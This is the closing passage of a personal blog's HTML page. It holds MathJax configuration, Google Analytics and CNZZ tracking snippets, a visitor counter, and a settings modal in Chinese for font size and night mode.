      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/scripts.js"></script>


  <script src="/js/home.js"></script>





<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-114383200-1', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->






	<div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
  </div>



	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h2 class="modal-title" id="myModalLabel">设置</h2>
      </div>
      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">


      <div class="modal-body">
          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
              正文字号大小
            </a>
          </div>
          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
          <div class="panel-body">
            您已调整页面字体大小
          </div>
        </div>
      


          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
              夜间护眼模式
            </a>
        </div>
          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
          <div class="panel-body">
            夜间模式已经开启，再次单击按钮即可关闭 
          </div>
        </div>

        <div>
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
        </div>
         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
          <div class="panel-body">
            To change is to be better to change often is to change perfect
          </div>
          <div class="panel-body">
            Copyright © 2018 To change is to be better to change often is to change perfect All Rights Reserved.
          </div>
        </div>
      </div>


      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <div class="modal-footer">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
      </div>
    </div>
  </div>
</div>
  
  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
  
</body>
</html>